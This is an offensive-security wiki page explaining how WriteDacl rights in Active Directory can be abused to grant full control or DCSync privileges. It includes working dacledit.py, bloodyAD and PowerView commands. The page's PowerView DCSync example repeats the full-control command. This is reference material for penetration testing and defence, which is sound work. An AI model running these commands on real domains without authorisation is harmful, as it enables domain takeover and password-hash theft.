---
authors: 'CravateRouge, KenjiEndo15, ShutdownRepo'
category: ad
---

# Grant rights

This abuse can be carried out when controlling an object that has `WriteDacl` over another object.

The attacker can write a new ACE to the target object’s DACL (Discretionary Access Control List). This can give the attacker full control of the target object.

Instead of giving full control, the same process can be applied to allow an object to [DCSync](../credentials/dumping/dcsync.md) by adding two ACEs with specific Extended Rights (`DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All`). Giving full control leads to the same thing since `GenericAll` includes all `ExtendedRights`, hence the two extended rights needed for DCSync to work.

Story time, Exchange Servers used to have `WriteDacl` over domain objects, allowing attackers to conduct a [PrivExchange](../exchange-services/privexchange.md) attack where control would be gained over an Exchange Server which would then be used to grant an attacker-controlled object DCSync privileges to the domain.

> [!TIP] ACE inheritance
> 
> If attacker can write an ACE (`WriteDacl`) for a container or organisational unit (OU), if inheritance flags are added (`0x01+ 0x02`) to the ACE, and inheritance is enabled for an object in that container/OU, the ACE will be applied to it. By default, all the objects with `AdminCount=0` will inherit ACEs from their parent container/OU.
> 
> Impacket's dacledit (Python) can be used with the `-inheritance` flag for that purpose ([PR#1291](https://github.com/fortra/impacket/pull/1291)).

> [!TIP] adminCount=1 (gPLink spoofing)
> 
> In April 2024, [Synacktiv explained](https://www.synacktiv.com/en/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory) that if `GenericAll`, `GenericWrite` or `Manage Group Policy Links` privileges are available against an Organisational Unit (OU), then it's possible to compromise its child users and computers with `adminCount=1` through "gPLink spoofing".
> 
> This can be performed with [OUned.py](https://github.com/synacktiv/OUned).

::: tabs

=== UNIX-like

From UNIX-like systems, this can be done with [Impacket](https://github.com/SecureAuthCorp/impacket)'s dacledit.py (Python).

```bash
# Give full control
dacledit.py -action 'write' -rights 'FullControl' -principal 'controlled_object' -target 'target_object' "$DOMAIN"/"$USER":"$PASSWORD"

# Give DCSync (DS-Replication-Get-Changes, DS-Replication-Get-Changes-All)
dacledit.py -action 'write' -rights 'DCSync' -principal 'controlled_object' -target 'target_object' "$DOMAIN"/"$USER":"$PASSWORD"
```

For a DCSync granting attack, instead of using dacledit, [ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) has the ability to operate that abuse with the `--escalate-user` option (see [this](https://medium.com/@arkanoidctf/hackthebox-writeup-forest-4db0de793f96)).

To enable inheritance, the `-inheritance` switch can be added to the command. Then it is possible to find interesting targets with `AdminCount=0`in BloodHound for example, by looking at the object attributs.

```bash
# Give full control on the Users container with inheritance to the child object
dacledit.py -action 'write' -rights 'FullControl' -principal 'controlled_object' -target-dn 'CN=Users,DC=domain,DC=local' -inheritance "$DOMAIN"/"$USER":"$PASSWORD"
```

Alternatively, it can be achieved using [bloodyAD](https://github.com/CravateRouge/bloodyAD)

```bash
# Give full control (with inheritance to the child object if applicable)
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add genericAll "$TargetObject" "$ControlledPrincipal"

# Give DCSync (DS-Replication-Get-Changes, DS-Replication-Get-Changes-All)
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add dcsync "$ControlledPrincipal"
```


=== Windows

From a Windows system, this can be achieved with [Add-DomainObjectAcl](https://powersploit.readthedocs.io/en/latest/Recon/Add-DomainObjectAcl/) ([PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) module).

```bash
# Give full control
Add-DomainObjectAcl -Rights 'All' -TargetIdentity "target_object" -PrincipalIdentity "controlled_object"

# Give DCSync (DS-Replication-Get-Changes, DS-Replication-Get-Changes-All)
Add-DomainObjectAcl -Rights 'All' -TargetIdentity "target_object" -PrincipalIdentity "controlled_object"
```

> [!TIP]
> A few tests showed the `Add-DomainObjectAcl` command needed to be run with the `-Credential` and `-Domain` options in order to work

:::


## Resources

[http://www.harmj0y.net/blog/redteaming/abusing-active-directory-permissions-with-powerview/](http://www.harmj0y.net/blog/redteaming/abusing-active-directory-permissions-with-powerview/)

[https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
